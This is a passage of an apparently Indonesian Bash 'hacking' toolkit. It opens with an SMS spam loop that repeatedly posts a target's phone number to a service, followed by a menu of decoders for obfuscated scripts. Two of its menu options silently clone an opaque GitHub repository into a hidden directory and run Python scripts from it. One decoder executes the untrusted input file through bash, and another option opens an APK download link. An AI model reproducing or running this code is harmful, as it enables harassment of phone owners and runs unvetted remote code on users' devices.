⠀⣾⣿⣿⣿⣿⣿⣿⣿⠻⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢿⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢰⣿⣿⣿⣿⣿⣿⣿⣿⡄⠙⢿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠠⣤⣀⠀⠀⠀⠠⣄⣀⣀⡉⢻⣿⣿⣿⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀
⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣦⣤⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⡀⠀⠀⠀⠀
⠀⢻⡟⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠛⠋⠉⠀⠀⢀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀
⠀⠀⠃⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠈⠉⠻⢿⣿⣿⣿⣷⡄⠀
⠀⠀⠀⠀⢸⣿⣿⡟⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠛⣿⣿⣿⣿⣿⣧⣀⣀⡄⠀⠀⠀⠀⠀⠀⠈⣿⡿⣿⣿⣷⠀
⠀⠀⠀⠀⢸⣿⡿⠁⠀⠀⠀⠙⠻⠿⣟⠻⢿⣿⣿⣿⣷⣦⡀⠀⠈⠻⢿⣿⣿⣭⣉⡉⠀⠀⠀⠀⠀⠀⠀⠀⠘⠀⠸⣿⣿⡄
⠀⠀⠀⠀⣸⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢿⣿⣿⣦⡀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠁
⠀⠀⠀⠠⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡟⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠟⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁
" | lolcat
echo -e "${r} JIKA ANDA INGIN MENGHINTIKANNYA TEKAN ${c}[ ${y}CTRL + Z ${c}]"
echo -e "${r} SCRIPT AKAN BERHENTI OTOMATIS"
echo ""
echo -e "${p} Development ${g}: ${c}Thxyzz404" 
echo ""
}
echo ""
clear
run() {
while true; do
emojis=(
"🤬"
"🥶"
"😈"
"🥵"
"🤨"
"😆"
)
randomIndex=$(( RANDOM % ${#emojis[@]} ))
clear
tolol_recode
echo -e "${r}[${g} Pengiriman No${c} : ${y}$nomor_telepon ${r}]${c}"
echo ""
response=$(curl -s "$url" -d "phone=$nomor_telepon")
response &> /dev/null | printf "\r By.Thxyzz404 ${emojis[$randomIndex]}\n"
echo ""
read -t 5 -p "" user_input
if [[ $user_input == "q" ]]; then
echo -e "${r}[!] Script Dihentikan oleh Pengguna."
echo ""
sleep 3 
break
fi
done
}
clear
tolol_recode
echo -e "${y}"
read -p "Masukkan nomor telepon [ 62xx ] : " nomor_telepon
run
   ;;
       10)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
              clear
              cd $HOME
g='\033[32;1m'
b='\033[34;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\033[0m'
yuki="ansi-rounded"
echo ""
echo "
░█▀▄░█▀▀░█▀▀░█▀█░█▀▄░█▀▀░█▀▄
░█░█░█▀▀░█░░░█░█░█░█░█▀▀░█░█
░▀▀░░▀▀▀░▀▀▀░▀▀▀░▀▀░░▀▀▀░▀▀░
" | boxes -d "$yuki" | lolcat
echo -e "${b}╔══════════════════════════════════════╗"
echo -e "║${g} AUTHOR ${r}= ${c}By.Thxyzz404                ${b}║"
echo -e "╠══════════════════════════════════════╣"
echo -e "${b}║${r}  [ ${g}01 ${r}] ${y}Base_32                      ${b}║"
echo -e "${b}║${r}  [ ${g}02 ${r}] ${y}Base_64                      ${b}║"
echo -e "${b}║${r}  [ ${g}03 ${r}] ${y}Obsufcute                    ${b}║"
echo -e "${b}║${r}  [ ${g}04 ${r}] ${y}Zlib + 64                    ${b}║"
echo -e "${b}║${r}  [ ${g}05 ${r}] ${y}Obf_64                       ${b}║"
echo -e "${b}║${r}  [ ${g}06 ${r}] ${y}Ultra-Stav                   ${b}║"
echo -e "${b}║${r}  [ ${g}07 ${r}] ${y}Marshal_Pyc                  ${b}║"
echo -e "${b}║${r}  [ ${g}08 ${r}] ${y}Dec_Hex_html                 ${b}║"
echo -e "${b}║${r}  [ ${g}09 ${r}] ${y}Dec_pyc                      ${b}║"
echo -e "${b}║${r}  [ ${g}10 ${r}] ${y}Dec_Malwarekid               ${b}║"
echo -e "${b}║${r}  [ ${g}11 ${r}] ${y}Dump Marshall                ${b}║"
echo -e "${b}║${r}  [ ${g}12 ${r}] ${y}Html Marshall                ${b}║"
echo -e "${b}║${r}  [ ${g}13 ${r}] ${y}Dec_SHC                      ${b}║"
echo -e "${b}║${r}  [ ${g}14 ${r}] ${y}Dump_Pydc                    ${b}║"
echo -e "${b}║${r}  [ ${g}15 ${r}] ${y}Dec_AST                      ${b}║"
echo -e "${b}║${r}  [ ${g}00 ${r}] ${g}Keluar                       ${b}║"
echo -e "${b}╚══════════════════════════════════════╝"
echo -e "${b}║"
echo -e "${b}║"
echo -e "${b}║"
read -p "$(echo -e "${b}╚═${r}[ ${g}Masukkan pilihan tuan 😈🔥${r} ]${c}══•➤${n} : ")" tod
echo -e "${c}"
case $tod in
 1|01)
clear
kon() {
local lol="$1"
echo "$lol" | base32 -d 2>/dev/null
if [ $? -ne 0 ]; then
   echo "$lol" | base32 --decode 2>/dev/null
fi
}
mek() {
local string="$1"
string=$(echo "$string" | tr -d '[:space:]')
local len=${#string}
if [ $((len % 8)) -ne 0 ]; then
   return 1
fi
if [[ ! "$string" =~ ^[A-Z2-7]*=*$ ]]; then
   return 1
fi
echo "$string" | base32 -d &>/dev/null
return $?
}
peju() {
local lol="$1"
local max="${2:-100}"    
echo -e "${r}[ ${g}INFO ${r}]${y} Proses decoder layer "
echo -e "${r}[ ${g}INFO ${r}]${y} Lapisan coba : $max "
echo ""    
local wok="$lol"
local layer=0
local count=0
while [ $layer -lt $max ]; do
  layer=$((layer + 1))        
  echo -e "${r}[ ${p}Development : Thxyzz404 ${r}]${n}" 
  echo ""
local decoded=$(kon "$wok")       
if [ $? -eq 0 ] && [ -n "$decoded" ]; then
    local temp=$(echo "$decoded" | tr -d '[:space:]' | head -c 100)
if mek "$temp" 2>/dev/null; then
echo -e "${r}[ ${g}✓ ${r}]${y} Berhasil decoder layer $layer"
echo ""
count=$((count + 1))
wok="$decoded"          
echo -e "${g}Preview${n}"
echo "$decoded" | head -5
echo ""
echo -e "${r}==========================="             
if [ $layer -lt $max ]; then
echo -e "${g}"
read -p "Lanjut decoder? (y/n) : " -n 1 -r
echo ""
if [[ ! $REPLY =~ ^[Yy]$ ]]; then
       break
    fi
fi
  else
      echo -e "${c} HASIL AKHIR ${n}"
      count=$((count + 1))   
echo ""
echo "========================================"
echo "$decoded"
echo "========================================"
echo ""
    break
fi
  else
      echo -e "${r}Gagall bkn base 32."
      echo "$wok" | head -10
   break
fi
echo ""
done
echo ""
echo -e "${r}============================================"
echo -e "${g}        Development : Thxyzz404 "
echo -e "${r}============================================"
echo -e "${y}Total lapis :${c} $layer "
echo "" 
read -p "Simpan hasil? (y/n) : " -n 1 -r
echo ""
if [[ $REPLY =~ ^[Yy]$ ]]; then
echo -e "${y}"
read -p "Nama file : " file
file="${file:-decoded_result.txt}"
echo "$decoded" > "$file" 2>/dev/null
echo ""
echo -e "${r}[ ${g}✓ ${r}]${c} Berhasil Tersimpan Di : $file "
sleep 3
echo ""
fi
mkdir -p "/sdcard/BASE_32"
dir="/sdcard/BASE_32/Decoder_Hasil.txt"
if [ -n "$decoded" ]; then
    echo "$decoded" > "$dir" 2>/dev/null
    if [ $? -eq 0 ]; then
        echo -e "${r}[ ${g}✓ ${r}]${c} Juga tersimpan di : $dir "
    fi
fi
echo ""
}
clear
echo ""
echo -e "${r}============================================"
echo -e "${g}        BASE32 MULTI-LAYER DECODER "
echo -e "${r}============================================"
echo ""
echo -e "${y} Contoh : /sdcard/Folder/file.sh "
echo -e "${c}"
read -p "Masukkan file path : " cuy
if [ ! -f "$cuy" ]; then
    clear 
    echo ""
    echo -e "${r}Error : file tidak ada."
    echo ""
fi
input=$(cat "$cuy")
if [ -z "$input" ]; then
    clear 
    echo ""
    echo -e "${r}Error : file kosong."
    echo ""
fi
echo -e "${p}"
read -p "Max layer [ default-100 ] : " max
echo ""
yr="${max:-100}"
peju "$input" "$yr"
;;
 2|02)
clear
kon() {
local lol="$1"
echo "$lol" | base64 -d 2>/dev/null
if [ $? -ne 0 ]; then
  echo "$lol" | base64 --decode 2>/dev/null
fi
}
mek() {
local string="$1"
string=$(echo "$string" | tr -d '[:space:]')
local len=${#string}
if [ $((len % 4)) -ne 0 ]; then
   return 1
fi
if [[ ! "$string" =~ ^[A-Za-z0-9+/]*=*$ ]]; then
   return 1
fi
echo "$string" | base64 -d &>/dev/null
return $?
}
peju() {
local lol="$1"
local max="${2:-100}"    
echo -e "${r}[ ${g}INFO ${r}]${y} Proses decoder layer "
echo -e "${r}[ ${g}INFO ${r}]${y} Lapisan coba : $max "
echo ""    
local wok="$lol"
local layer=0
local count=0
while [ $layer -lt $max ]; do
  layer=$((layer + 1))        
  echo -e "${r}[ ${p}Development : Thxyzz404 ${r}]${n}" 
  echo ""
local decoded=$(kon "$wok")       
if [ $? -eq 0 ] && [ -n "$decoded" ]; then
    local temp=$(echo "$decoded" | tr -d '[:space:]' | head -c 100)
if mek "$temp" 2>/dev/null; then
echo -e "${r}[ ${g}✓ ${r}]${y} Berhasil decoder layer $layer"
echo ""
count=$((count + 1))
wok="$decoded"          
echo -e "${g}Preview${n}"
echo "$decoded" | head -5
echo ""
echo -e "${r}==========================="             
if [ $layer -lt $max ]; then
echo -e "${g}"
read -p "Lanjut decoder? (y/n) : " -n 1 -r
echo ""
if [[ ! $REPLY =~ ^[Yy]$ ]]; then
       break
    fi
fi
  else
      echo -e "${c} HASIL AKHIR ${n}"
      count=$((count + 1))   
echo ""
echo "========================================"
echo "$decoded"
echo "========================================"
echo ""
    break
fi
  else
      echo -e "${r}Gagall bkn base 64."
      echo "$wok" | head -10
   break
fi
echo ""
done
echo ""
echo -e "${r}============================================"
echo -e "${g}        Development : Thxyzz404 "
echo -e "${r}============================================"
echo -e "${y}Total lapis :${c} $layer "
echo "" 
read -p "Simpan hasil? (y/n) : " -n 1 -r
echo ""
if [[ $REPLY =~ ^[Yy]$ ]]; then
echo -e "${y}"
read -p "Nama file : " file
file="${file:-decoded_result.txt}"
echo "$decoded" > "$file" 2>/dev/null
echo ""
echo -e "${r}[ ${g}✓ ${r}]${c} Berhasil Tersimpan Di : $file "
sleep 3
echo ""
fi
mkdir -p "/sdcard/BASE_64"
dir="/sdcard/BASE_64/Decoder_Hasil.txt"
if [ -n "$decoded" ]; then
    echo "$decoded" > "$dir" 2>/dev/null
    if [ $? -eq 0 ]; then
        echo -e "${r}[ ${g}✓ ${r}]${c} Juga tersimpan di : $dir "
    fi
fi
echo ""
}
clear
echo ""
echo -e "${r}============================================"
echo -e "${g}        BASE64 MULTI-LAYER DECODER "
echo -e "${r}============================================"
echo ""
echo -e "${y} Contoh : /sdcard/Folder/file.sh "
echo -e "${c}"
read -p "Masukkan file path : " cuy
if [ ! -f "$cuy" ]; then
    clear 
    echo ""
    echo -e "${r}Error : file tidak ada."
    echo ""
fi
input=$(cat "$cuy")
if [ -z "$input" ]; then
    clear 
    echo ""
    echo -e "${r}Error : file kosong."
    echo ""
fi
echo -e "${p}"
read -p "Max layer [ default-100 ] : " max
echo ""
yr="${max:-100}"
peju "$input" "$yr"
;;
 3|03)
clear
decoder() {
local sc="$1"
local max="${2:-100}"   
echo -e "${r}[ ${g}INFO ${r}]${y} MULTI-LAYER DECODER"
echo -e "${r}[ ${g}INFO ${r}]${y} Maksimal layer : $max "
echo ""    
local current=$(cat "$sc")
local layer=0    
while [ $layer -lt $max ]; do
echo -e "${r}[ ${p}Development : Thxyzz404 ${r}]${n}"     
echo -e "${g}"
read -p "Masukkan output file : " out
layer=$((layer + 1))
data=${current//eval/echo}
echo "$data" > "$out"
touch dec.sh
bash "$out" > dec.sh
rm "$out"
mv -f dec.sh "$out"        
echo -e "${r}[ ${g}✓ ${r}]${y} Berhasil decode layer $layer"
echo ""
current=$(cat "$out")       
echo -e "${g}Preview:${n}"
echo "$current" | head -5
echo ""
echo -e "${r}==========================="        
if [ $layer -lt $max ]; then
echo -e "${g}"
read -p "Lanjut decode? (y/n) : " -n 1 -r
echo ""
if [[ ! $REPLY =~ ^[Yy]$ ]]; then
    break
  fi
fi
done  
    echo ""
    echo -e "${r}============================================"
    echo -e "${g}        MULTI-LAYER DECODER "
    echo -e "${r}============================================"
    echo -e "${y}Total layer:${c} $layer "
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${c} Hasil akhir tersimpan di : $out"
    echo ""
    mkdir -p "/sdcard/SHEL_DEC"
    dir="/sdcard/SHEL_DEC/Decoder_Hasil.txt"
    if [ -f "$out" ] && [ -n "$current" ]; then
        echo "$current" > "$dir" 2>/dev/null
        if [ $? -eq 0 ]; then
            echo -e "${r}[ ${g}✓ ${r}]${c} Juga tersimpan di : $dir "
        fi
    fi
    echo ""
}
clear
echo ""
echo -e "${r}============================================"
echo -e "${g}        MULTI-LAYER DECODER "
echo -e "${r}============================================"
echo ""
echo -e "${y} Contoh : /sdcard/Folder/file.sh "
echo -e "${c}"
read -p "Masukkan file path : " sc
if [ ! -f "$sc" ]; then
    clear 
    echo ""
    echo -e "${r}Error: File tidak ditemukan."
    echo ""
fi
echo -e "${p}"
read -p "Max layer [ default-100 ] : " max
echo ""
yr="${max:-100}"
decoder "$sc" "$yr"
;;
 4|04)
lol="ansi-rounded"
if ! python2 -m pip show xdis &> /dev/null; then
    clear 
    echo ""
    echo -e "${r}[ ${g}x ${r}]${c} xdis belum terinstall, sedang menginstall..!!"
    echo -e "${n}"
    python2 -m pip install xdis==5.0.11
    sleep 3
else
    clear 
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${y} xdis sudah terinstall."
    echo ""
    sleep 3
fi
if ! python2 -m pip show uncompyle6 &> /dev/null; then
    clear 
    echo ""
    echo -e "${r}[ ${g}x ${r}]${c} uncompyle6 belum terinstall, sedang menginstall..!!"
    echo -e "${n}"
    python2 -m pip install uncompyle6==3.7.4
    sleep 3
else
    clear 
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${y} uncompyle6 sudah terinstall."
    echo ""
    sleep 3
    clear 
fi
bacot_ajg() {
    local tujuan="$1"
    echo "" 
    echo -e "${r}[ ${g}+ ${r}]${c} Membaca file encripsi : $dra_lol"
    sleep 3
    if [[ ! -f "$dra_lol" ]]; then
        echo -e "${r} Error : Input File Yang Bener Bodoh."
        return 1
    fi    
    local content
    content=$(cat "$tujuan" 2>/dev/null | tr -d '\r')
    local base_name
    base_name=$(basename "$dra_lol")
    base_name="${base_name%.*}"
    local timestamp
    timestamp=$(date +"%Y%m%d_%H%M%S")
    local output_filename="Hasil_${base_name}_${timestamp}.py"   
    local layer_count=0
    local decoded_content="$content"
    local pattern="exec(__import__('zlib').decompress(__import__('base64').b64decode('([^']+)')))"
    while true; do
        layer_count=$((layer_count + 1))
        echo -e "${r}[ ${g}+ ${r}]${y} Mencari string lapisan : $layer_count"
        local encoded_string
        encoded_string=$(echo "$decoded_content" | grep -o "exec(__import__('zlib').decompress(__import__('base64').b64decode('[^']*')))" | \
                        sed "s/exec(__import__('zlib').decompress(__import__('base64').b64decode('//" | sed "s/')))//")       
        if [[ -z "$encoded_string" ]]; then
            echo -e "${r}[ ${g}! ${r}]${p} Jika gagal berarti bkn mengandung enc zlib."
            break
        fi        
        echo -e "${r}[ ${g}+ ${r}]${y} Sedang menganalisa string : ${#encoded_string}"
        sleep 5
        echo -e "${r}[ ${g}+ ${r}]${p} Sedang proses decoder..!!"
        sleep 3
        local new_content
        new_content=$(python3 -c "
import base64, zlib
try:
    decoded_b64 = base64.b64decode('$encoded_string')
    decompressed_data = zlib.decompress(decoded_b64)
    print(decompressed_data.decode('utf-8'))
except Exception as e:
    print('ERROR:' + str(e))
" 2>/dev/null)      
        if [[ "$new_content" == ERROR* ]]; then
            echo ""
            echo -e "${r} Terjadi kesalahan pada string [ $layer_count : ${new_content#ERROR:} ]"
            break
        fi       
        echo -e "${r}[ ${g}✓ ${r}]${b} Sukses decoder : $layer_count"
        echo -e "${r}[ ${g}+ ${r}]${y} Panjang hasil : ${#new_content} karakter"        
        decoded_content="$new_content"        
        local preview
        if [[ ${#new_content} -gt 20 ]]; then
            preview="${new_content:0:20}..."
        else
            preview="$new_content"
        fi
        echo -e "${r}[ ${g}? ${r}]${c} Preview : $preview"
        sleep 2
    done
    {
        echo "# DECODED FROM : $dra_lol"
        echo "# TOTAL LAYERS : $layer_count"
        echo "# TIME WAKTU : $(date)"
        echo ""
        echo "$decoded_content"
    } > "$output_filename"
    echo -e "${r}[ ${g}✓ ${r}]${c} Total layers : $layer_count"
    echo -e "${r}[ ${g}✓ ${r}]${c} File yang di simpan : $output_filename"    
    local file_size
    file_size=$(wc -c < "$output_filename" 2>/dev/null || echo "0")
    echo -e "${r}[ ${g}✓ ${r}]${c} File size : $file_size" 
    echo ""
    mkdir -p "/sdcard/Decoder_ZLIB"
    dir="/sdcard/Decoder_ZLIB/Decoder_Hasil.txt"
    if [ -n "$decoded_content" ]; then
        echo "$decoded_content" > "$dir" 2>/dev/null
        if [ $? -eq 0 ]; then
            echo -e "${r}[ ${g}✓ ${r}]${c} Juga tersimpan di : $dir "
        fi
    fi
    echo ""
    return 0
}
yocot_bego() {
clear 
echo "
░▀▀█░█░░░▀█▀░█▀▄░░░░░░░░░▄▀▀░█░█
░▄▀░░█░░░░█░░█▀▄░░░▄█▄░░░█▀▄░░▀█
░▀▀▀░▀▀▀░▀▀▀░▀▀░░░░░▀░░░░░▀░░░░▀

  Development : By.Thxyzz404
" | boxes -d "$lol" | lolcat
}
main() {
    yocot_bego
    echo "" 
    read -p "$(echo -e "${y}Masukkan Path File ${r}[ ${g}contoh : nama_file.py ${r}]${c} : ")" dra_lol
    echo ""
    tujuan=$(echo "$dra_lol" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')    
    if [[ -n "$dra_lol" ]]; then
        bacot_ajg "$dra_lol"
    else
        echo -e "${r}Masukin file yang bener lol."
        echo ""
    fi
}
main
;;
 5|05)
clear
decoder() {
local sc="$1"
local max="${2:-100}"   
echo -e "${r}[ ${g}INFO ${r}]${y} MULTI-LAYER DECODER"
echo -e "${r}[ ${g}INFO ${r}]${y} Maksimal layer : $max "
echo ""
local current=$(cat "$sc")
local layer=0
local out=""    
while [ $layer -lt $max ]; do
layer=$((layer + 1))
echo -e "${r}[ ${p}Development : Thxyzz404 ${r}]${n}"
echo -e "${g}"
dekripsi=$(echo "$current" | tr ';' '\n' | grep 'RzE=' | cut -d '"' -f2 | tr ' ' '\n' | rev | base64 -d)
read -p "Masukkan output file : " out
echo "$dekripsi" > "$out"       
echo -e "${r}[ ${g}✓ ${r}]${y} Berhasil decode layer $layer"
echo ""
current=$(cat "$out")        
echo -e "${g}Preview:${n}"
echo "$current" | head -5
echo ""
echo -e "${r}==========================="  
if [ $layer -lt $max ]; then
echo -e "${g}"
read -p "Lanjut decode? (y/n) : " -n 1 -r
echo ""
if [[ ! $REPLY =~ ^[Yy]$ ]]; then
     break
  fi
fi
done  
    echo ""
    echo -e "${r}============================================"
    echo -e "${g}        MULTI-LAYER DECODER "
    echo -e "${r}============================================"
    echo -e "${y}Total layer:${c} $layer "
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${c} Hasil akhir tersimpan di : $out"
    echo ""
    mkdir -p "/sdcard/Dec_FTA"
    dir="/sdcard/Dec_FTA/Decoder_Hasil.txt"
    if [ -f "$out" ] && [ -n "$current" ]; then
        echo "$current" > "$dir" 2>/dev/null
        if [ $? -eq 0 ]; then
            echo -e "${r}[ ${g}✓ ${r}]${c} Juga tersimpan di: $dir "
        fi
    fi
    echo ""
}
clear
echo ""
echo -e "${r}============================================"
echo -e "${g}        MULTI-LAYER DECODER "
echo -e "${r}============================================"
echo ""
echo -e "${y} Contoh : /sdcard/Folder/file.sh "
echo -e "${c}"
read -p "Masukkan file path : " sc
if [ ! -f "$sc" ]; then
    clear 
    echo ""
    echo -e "${r}Error: File tidak ditemukan."
    echo ""
fi
echo -e "${p}"
read -p "Max layer [ default-100 ] : " max
echo ""
yr="${max:-100}"
decoder "$sc" "$yr"
;;
 6|06)
clear
cd $HOME
PFERFIX="$HOME"
ANK_IDIOT="$PREFIX/tmp/.Loar"
PEJU="Kamer.py"
memek() {
echo -e "$1"
}
kontol() {
memek "${r}[ ${g}ERROR ${r}]${y} $1"
}
clear
if [ -d "$ANK_IDIOT" ]; then
    cd "$ANK_IDIOT" || kontol "Terjadi kesalahan."
    if [ -f "$PEJU" ]; then
        echo ""
        memek "${r}[ ${g}✓ ${r}]${c} Sedang menjalankan tools..!!"
        echo ""
        python3 "$PEJU" || kontol "Terjadi kesalahan."
    else
        echo ""
        memek "${r}[ ${g}+ ${r}]${y} Tidak di temukan mengclone ulang..!!${c}"
        echo ""
        cd "$HOME" || kontol "Gagal kembali ke HOME."
        rm -rf "$ANK_IDIOT"
        git clone --depth=32 https://github.com/QrwszXnXnchommed0e56/.Loar "$ANK_IDIOT" >/dev/null 2>&1 || kontol "Terjadi kesalahan."
        cd "$ANK_IDIOT" || kontol "Terjadi kesalahan."
        python3 "$PEJU" || kontol "Terjadi kesalahan."
    fi
else
    memek "${r}[ ${g}+ ${r}]${g} Mengclone repo.${c}"
    echo ""
    cd "$HOME" || kontol "Gagal kembali ke HOME."
    git clone --depth=32 https://github.com/QrwszXnXnchommed0e56/.Loar "$ANK_IDIOT" >/dev/null 2>&1 || kontol "Terjadi kesalahan."
    cd "$ANK_IDIOT" || kontol "Terjadi kesalahan."
    python3 "$PEJU" || kontol "Terjadi kesalahan."
fi
;;
 7|07)
clear
cd $HOME
PFERFIX="$HOME"
ANK_IDIOT="$PREFIX/tmp/.Loar"
PEJU="Sal.py"
memek() {
echo -e "$1"
}
kontol() {
memek "${r}[ ${g}ERROR ${r}]${y} $1"
}
clear
if [ -d "$ANK_IDIOT" ]; then
    cd "$ANK_IDIOT" || kontol "Terjadi kesalahan."
    if [ -f "$PEJU" ]; then
        echo ""
        memek "${r}[ ${g}✓ ${r}]${c} Sedang menjalankan tools..!!"
        echo ""
        python3 "$PEJU" || kontol "Terjadi kesalahan."
    else
        echo ""
        memek "${r}[ ${g}+ ${r}]${y} Tidak di temukan mengclone ulang..!!${c}"
        echo ""
        cd "$HOME" || kontol "Gagal kembali ke HOME."
        rm -rf "$ANK_IDIOT"
        git clone --depth=32 https://github.com/QrwszXnXnchommed0e56/.Loar "$ANK_IDIOT" >/dev/null 2>&1 || kontol "Terjadi kesalahan."
        cd "$ANK_IDIOT" || kontol "Terjadi kesalahan."
        python3 "$PEJU" || kontol "Terjadi kesalahan."
    fi
else
    memek "${r}[ ${g}+ ${r}]${g} Mengclone repo.${c}"
    echo ""
    cd "$HOME" || kontol "Gagal kembali ke HOME."
    git clone --depth=32 https://github.com/QrwszXnXnchommed0e56/.Loar "$ANK_IDIOT" >/dev/null 2>&1 || kontol "Terjadi kesalahan."
    cd "$ANK_IDIOT" || kontol "Terjadi kesalahan."
    python3 "$PEJU" || kontol "Terjadi kesalahan."
fi
;;
 8|08)
clear 
set -euo pipefail
echo ""
echo -e "${p} Development ${g}: ${c}By.Thxyzz404"
echo -e "${y}"
read -p "Masukkan file path [ contoh : /sdcard/Folder/file.html ] : " INPUT
echo ""
if [[ ! -f "$INPUT" ]]; then
  clear 
  echo ""
  echo -e "${c} File tidak ditemukan : $INPUT"
  echo ""
fi
BASENAME=$(basename "$INPUT")
mkdir -p "/sdcard/DEC_HTML"
OUTPUT="/sdcard/DEC_HTML/Decoder_${BASENAME%.txt}"
encoded=$(cat "$INPUT")
max_layer=100
layer=0
current="$encoded"
decoded=""
echo -e "${r}[ ${g}INFO ${r}]${y} Proses Multi-Layer Decoder"
echo -e "${r}[ ${g}INFO ${r}]${y} Maksimal layer : $max_layer "
echo ""
while [ $layer -lt $max_layer ]; do
layer=$((layer + 1))
echo -e "${r}[ ${p}Development : Thxyzz404 ${r}]${n}"
echo ""
decoded=$(printf '%b' "${current//%/\\x}")  
echo -e "${r}[ ${g}✓ ${r}]${y} Berhasil decode layer $layer"
echo ""
if [[ "$decoded" != *"%"* ]]; then
echo -e "${c} HASIL AKHIR ${n}"
echo ""
echo "========================================"
echo "$decoded" | head -10
echo "========================================"
echo ""
 break
fi   
echo -e "${g}Preview:${n}"
echo "$decoded" | head -5
echo ""
echo -e "${r}==========================="   
current="$decoded"
if [ $layer -lt $max_layer ]; then
echo -e "${g}"
read -p "Lanjut decode? (y/n) : " -n 1 -r
echo ""
if [[ ! $REPLY =~ ^[Yy]$ ]]; then
    break
   fi
fi
done
echo "$decoded" > "$OUTPUT"
echo ""
echo -e "${r}============================================"
echo -e "${g}        MULTI-LAYER DECODER "
echo -e "${r}============================================"
echo -e "${y}Total layer:${c} $layer "
echo ""
echo -e "${r}[ ${g}✓ ${r}]${c} File telah di decoder menyimpan di : $OUTPUT"
echo ""
;;
 9|09)
clear 
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣷⠀⠀⢠⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⡇⠀⣸⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⡇⠀⢿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀
⠀⣠⣶⣦⡀⠹⣿⣿⣿⣿⡿⠁⠀⠘⣿⣿⣿⣿⣿⠇⣠⣴⣶⡄⠀
⢰⣿⣿⣿⣿⣆⠉⠛⠛⠋⠁⣀⣀⣀⠈⠛⠛⠛⠁⣼⣿⣿⣿⣿⡀
⢸⣿⣿⣿⣿⣿⡆⠀⢀⣴⣿⣿⣿⣿⣿⣦⠀⠀⢸⣿⣿⣿⣿⣿⡇
⠈⢿⣿⣿⣿⣿⠃⣠⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⢸⣿⣿⣿⣿⠟⠀
⠀⠀⠉⠙⠋⣡⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣍⠛⠋⠁⠀⠀
⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀
⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⢿⣿⣿⣿⣿⡿⠿⢿⣿⣿⣿⣿⡿⠛⠁
" | lolcat
echo -e "${g}===============${r} PyLingual PYC ${g}==============="
echo ""
echo -e "${c} MOHON BERSABAR SEDANG PROSES LOADING..!!"
echo ""
for i in {1..10}; do
    echo -ne "\r${y} Loading..!! ${r}[ ${g}$((i * 10))% ${r}]"
    sleep 0.3
done
echo -ne "\r${y} Loading..!! ${r}[ ${g}100% ${r}]"
sleep 1
echo ""
xdg-open "https://www.mediafire.com/file/daec96wzlqfzjpc/PYC.apk/file"
echo ""
echo -e "${g} SELESAI MEMBUK LINK..!!"
echo ""
;;
 10)
decode_malwarekid() {
    local file="$1"
    [ ! -f "$file" ] && echo "❌ File tidak ditemukan" && return 1
    local encoded=""
    while IFS= read -r line; do
        if [[ "$line" == *"__FOLLOW_MALWAREKID__"* ]] && [[ "$line" == *"="* ]]; then
            local value="${line#*=}"
            value="${value//[\"\'+]/}"
            value="${value//[[:space:]]/}"
            [[ "$value" == *\\ ]] && value="${value%\\}"
            encoded+="$value"
        fi
    done < "$file"
    [ -z "$encoded" ] && {
        encoded=$(grep -o '\\x[0-9a-fA-F]\{2\}' "$file" | tr -d '\n')
    }   
    [ -z "$encoded" ] && echo "❌ Tidak ditemukan encoded payload" && return 1
    local hex="${encoded//\\x/}"
    local decoded=""
    local bytes
